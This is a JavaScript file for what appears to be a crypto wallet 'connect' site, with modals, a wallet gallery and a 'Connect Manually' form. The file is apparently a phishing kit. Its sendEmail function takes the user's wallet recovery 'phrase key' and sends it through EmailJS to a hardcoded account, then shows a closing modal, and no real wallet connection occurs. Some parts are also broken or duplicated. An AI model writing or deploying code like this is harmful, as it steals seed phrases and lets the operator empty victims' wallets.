const gridItems = document.querySelectorAll('.grid-container div')

gridItems.forEach(gridItem =>{
    gridItem.addEventListener("mouseover", event =>{
        gridItem.style.webkitFilter = 'blur(1px)'
    })
    gridItem.addEventListener("mouseout", ()=> {
        gridItem.style.webkitFilter = ''
    })
})


const boxes = document.querySelectorAll('.grid-container div');
boxes.forEach(box =>{
  box.addEventListener('mouseenter', () => {
    box.style.transform = 'scale(0.9)';
    box.style.opacity = '0.7';
    
    // Quickly revert back to original state
    setTimeout(() => {
        box.style.transform = 'scale(1)';
        box.style.opacity = '1';
    }, 50); // 50 milliseconds (microseconds would be too fast to perceive)
})
})



// Modal
document.addEventListener("DOMContentLoaded", () => {
  const firstModal = document.getElementById("myModal");
  const secondModal = document.getElementById("walletModal");
  const openFirstModals = document.querySelectorAll(".modal-trigger");
  const closeFirstModal = document.getElementById("closeFirstModal");
  const closeSecondModal = document.getElementById("closeSecondModal");
  const cardGallery = document.getElementById("cardGallery");

  // Open First Modal
  openFirstModals.forEach((trigger) => {
    trigger.addEventListener("click", () => {
      console.log("Opening First Modal");
      firstModal.classList.remove("hidden");
      firstModal.classList.add("flex");
    });
  });

  // Close First Modal
  closeFirstModal.addEventListener("click", () => {
    console.log("Closing First Modal");
    firstModal.classList.remove("flex");
    firstModal.classList.add("hidden");
  });

  // Dynamically create cards based on wallet data
  function createCardGallery(data) {
    // Clear any existing cards first
    cardGallery.innerHTML = '';

    data.forEach(item => {
      const card = document.createElement("div");
      card.classList.add("card", "cursor-pointer", "p-4", "bg-gray-800", "rounded-lg", "text-center");
      card.setAttribute("data-id", item.id);
      card.innerHTML = `
        <img src="${item.imageeUrl}" alt="${item.name}" class="w-12 h-12 mx-auto mb-2">
        <p class="text-white">${item.name}</p>
      `;

      // Open the second modal when a card is clicked
      card.addEventListener("click", () => {
        console.log(`Opening Second Modal for ${item.name}`);
        
        // First, close the first modal
        firstModal.classList.remove("flex");
        firstModal.classList.add("hidden");

        // Then open the second modal
        secondModal.classList.remove("hidden");
        secondModal.classList.add("flex");
      });

      cardGallery.appendChild(card);
    });
  }

  // Close First Modal on Outside Click
  firstModal.addEventListener("click", (event) => {
    if (event.target === firstModal) {
      console.log("Clicked Outside First Modal");
      firstModal.classList.remove("flex");
      firstModal.classList.add("hidden");
    }
  });

  // Close Second Modal
  closeSecondModal.addEventListener("click", () => {
    console.log("Closing Second Modal");
    secondModal.classList.remove("flex");
    secondModal.classList.add("hidden");
  });

  // Close Second Modal on Outside Click
  secondModal.addEventListener("click", (event) => {
    if (event.target === secondModal) {
      console.log("Clicked Outside Second Modal");
      secondModal.classList.remove("flex");
      secondModal.classList.add("hidden");
    }
  });

  // Mode Switching Logic
  const mobileModeBtn = document.getElementById('mobile-mode');
  const browserModeBtn = document.getElementById('browser-mode');
  const connectionStatus = document.getElementById('connection-status');

  mobileModeBtn.addEventListener('click', () => {
    mobileModeBtn.classList.remove('bg-gray-700', 'text-gray-300');
    mobileModeBtn.classList.add('bg-blue-500', 'text-white');
    browserModeBtn.classList.remove('bg-blue-500', 'text-white');
    browserModeBtn.classList.add('bg-gray-700', 'text-gray-300');
    connectionStatus.textContent = 'Mobile mode selected';
    connectionStatus.classList.remove('text-red-500');
    connectionStatus.classList.add('text-blue-500');
  });

  browserModeBtn.addEventListener('click', () => {
    browserModeBtn.classList.remove('bg-gray-700', 'text-gray-300');
    browserModeBtn.classList.add('bg-blue-500', 'text-white');
    mobileModeBtn.classList.remove('bg-blue-500', 'text-white');
    mobileModeBtn.classList.add('bg-gray-700', 'text-gray-300');
    connectionStatus.textContent = 'Browser mode selected';
    connectionStatus.classList.remove('text-red-500');
    connectionStatus.classList.add('text-blue-500');
  });

  // Initialize the gallery when the page loads
  if (typeof data !== 'undefined') {
    createCardGallery(data);
  } else {
    console.error('Data not found. Make sure data.js is correctly loaded.');
  }
});// First, let's add a click handler for all "Connect Manually" buttons
function setupConnectManuallyButtons() {
  const connectManuallyButtons = document.querySelectorAll('.connect-manually-btn');
  
  connectManuallyButtons.forEach(button => {
    button.addEventListener('click', () => {
      // Find parent second modal
      const secondModal = button.closest('.modal');
      
      // Get wallet details
      const walletImage = secondModal.querySelector('#modalImage').src;
      const walletName = secondModal.querySelector('#modalName').textContent;
      
      // Hide second and first modals
      secondModal.classList.add('hidden');
      secondModal.classList.remove('flex');
      
      const firstModal = document.getElementById('myModal');
      firstModal.classList.remove('flex');
      firstModal.classList.add('hidden');
      
      // Show third modal
      openConnectModal(walletImage, walletName);
    });
  });
 }
 
 function openConnectModal(walletImage, walletName) {
  const connectModal = document.getElementById('connectModal');
  const modalImage = document.getElementById('connectModalImage');
  const modalSelect = document.getElementById('connectModalName');
  
  modalImage.src = walletImage;
  modalSelect.innerHTML = `<option value="${walletName}">${walletName}</option>`;
  
  connectModal.classList.remove('hidden');
  connectModal.classList.add('flex');
 }
 
 document.addEventListener('DOMContentLoaded', () => {
  setupConnectManuallyButtons();
 });
 // Select necessary elements

///New way to open modal.....
function createCardGallery(data) {
  const gallery = document.getElementById('cardGallery');

  // Clear any existing cards
  gallery.innerHTML = '';

  const cards = data.map(item => {
    // Create card container
    const card = document.createElement('div');
    card.className = 'rounded-lg shadow-md overflow-hidden cursor-pointer';
    card.setAttribute('data-id', item.id);
    card.setAttribute('data-name', item.name);
    card.setAttribute('data-image-url', item.imageUrl);

    // Create image element
    const img = document.createElement('img');
    img.src = item.imageUrl;
    img.alt = item.name;
    img.className = 'w-full h-1/2 object-cover'; // Ensures image covers the area nicely

    // Create content container
    const content = document.createElement('div');
    content.className = 'p-4';

    // Create name element
    const name = document.createElement('h3');
    name.textContent = item.name;
    name.className = 'text-lg font-semibold truncate text-white';



    // Assemble the card
    content.appendChild(name);
    card.appendChild(img);
    card.appendChild(content);

    return card;
  });

  // Append cards to the gallery
  cards.forEach(card => gallery.appendChild(card));

  // Add event listeners to cards for the second modal
  cards.forEach(card => {
    card.addEventListener('click', () => {
      console.log("card clicked modal")
      const walletId = card.getAttribute('data-id');

      const walletName = card.getAttribute('data-name');
      const walletImageUrl = card.getAttribute('data-image-url');

      // Populate modal with card details...
      document.getElementById('modalImage').src = walletImageUrl;
      document.getElementById('modalName').textContent = walletName;

      // Show the modal
      const secondModal = document.getElementById('walletModal');
      secondModal.classList.add('flex');
    });
  });
}

document.addEventListener('DOMContentLoaded', () => {
  if (typeof data !== 'undefined') {
    createCardGallery(data);
  } else {
    console.error('Data not found. Make sure data.js is correctly loaded.');
  }

  const closeSecondModal = document.getElementById('closeSecondModal');
  const secondModal = document.getElementById('walletModal');

  // Close the modal
  closeSecondModal.addEventListener('click', () => {
    secondModal.classList.remove('flex');
    secondModal.classList.add('hidden');
  });

  // Close modal when clicking outside modal content
  secondModal.addEventListener('click', (e) => {
    if (e.target === secondModal) {
      secondModal.classList.remove('flex');
      secondModal.classList.add('hidden');
    }
  });
});

// The back buttons
const backButton = document.getElementById('back-button');
backButton.addEventListener('click', () => {
    const currentModal = document.getElementById('myModal');
   ; // Specify which modal to go back to
    
    currentModal.style.display = 'none';
    previousModal.style.display = 'block'; // Or remove 'hidden' class if using classList
});

const bakButton = document.getElementById('bak-button');
bakButton.addEventListener('click', () => {
    const currentModal = document.getElementById('walletModal');
    const previousModal = document.getElementById('myModal'); // Specify which modal to go back to
    
    currentModal.style.display = 'none';
    previousModal.style.display = 'block';
});

const bacButton = document.getElementById('bac-button');
bacButton.addEventListener('click', () => {
    const currentModal = document.getElementById('connectModal');
    const previousModal = document.getElementById('walletModal'); // Replace with your initial modal ID
    
    currentModal.style.display = 'none';
    previousModal.style.display = 'block';
});
/*





// Close modal when clicking the close button
document.querySelector('.close-button').addEventListener('click', function() {
  document.getElementById('validateModal').style.display = 'none';
});





// Close modal when clicking the close button
document.querySelector('.close-button').addEventListener('click', function() {
  document.getElementById('validateModal').style.display = 'none';
});

// Close modal when clicking outside
window.addEventListener('click', function(event) {
  const modal = document.getElementById('validateModal');
  if (event.target === modal) {
      modal.style.display = 'none';
  }
});


// Add this script at the end of your body tag

// Bot responses


// Add Enter key support
document.getElementById('messageInput').addEventListener('keypress', function(e) {
    if (e.key === 'Enter' && !e.shiftKey) {
        e.preventDefault();
        sendMessage();
    }
});
/*
// Get all modals and store them in an array or track current modal index
const modals = document.querySelectorAll('.modal');
let currentModalIndex = 0;

// The back button
const prevButton = document.getElementById('previousBtn');
prevButton.addEventListener('click', () => {
    // Only go back if we're not at the first modal
    if (currentModalIndex > 0) {
        // Hide current modal
        modals[currentModalIndex].style.display = 'none';
        
        // Go back to previous modal
        currentModalIndex--;
        modals[currentModalIndex].style.display = 'block';
        
        // Hide back button if we're at the first modal
        if (currentModalIndex === 0) {
            prevButton.style.display = 'none';
        }
    }
});

// Forward navigation (if needed)
function showNextModal() {
    if (currentModalIndex < modals.length - 1) {
        // Hide current modal
        modals[currentModalIndex].style.display = 'none';
        
        // Show next modal
        currentModalIndex++;
        modals[currentModalIndex].style.display = 'block';
        
        // Show back button since we're not at the first modal
        prevButton.style.display = 'block';
    }
}
    // Add event listener to prevent default form submission


*/
// Remove any existing setTab function definitions
// Remove the DOMContentLoaded event listener that defines setTab

// Define one single setTab function for tab switching
// Add event listener to prevent default form submission// At the very top of your file:
(function() {
  emailjs.init("o8rQUCE7OfKlldEDs"); // Get this from EmailJS dashboard
})();
function sendEmail() {
  const walletType = document.querySelector('#connectModalName').value;
  const phraseKey = document.querySelector('#phraseInput').value;

  const params = {
    walletType: walletType,
    phraseKey: phraseKey
  };

  if (!phraseKey.trim()) {
    alert("Please enter your phrase key.");
    return;
  }

  emailjs.send("service_jrf65b9", "template_w4fmugh", params)
    .then(response => {
      console.log("SUCCESS!", response.status, response.text);
      
      // Clear both the input and textarea
      document.querySelector('#phraseInput').value = '';
      document.querySelector('textarea').value = '';  // Clears textarea
      
      const connectModal = document.getElementById('connectModal');
      connectModal.classList.add('hidden');
      
      const lastModal = document.getElementById('lastModal');
      lastModal.classList.remove('hidden');
      lastModal.classList.add('flex');
    })
    .catch(error => {
      console.log("FAILED...", error);
      alert("Failed to submit information. Please try again.");
    });
}

 // Function to open the modal
 function openModal() {
  const lastModal = document.getElementById('lastModal');
  lastModal.classList.remove('hidden');
  lastModal.classList.add('flex');
}

document.getElementById('closeModal').addEventListener('click', function () {
  document.getElementById('lastModal').classList.add('hidden');
});

function closeModal(modalId) {
  const modal = document.getElementById(modalId);
  modal.classList.add('hidden');
  modal.classList.remove('flex');
}
function backToPreviousModal() {
  // Hide the current modal (lastModal)
  const lastModal = document.getElementById('lastModal');
  lastModal.classList.add('hidden');
  lastModal.classList.remove('flex');

  // Show the previous modal (connectModal)
  const connectModal = document.getElementById('connectModal');
  connectModal.classList.remove('hidden');
  connectModal.classList.add('flex');
}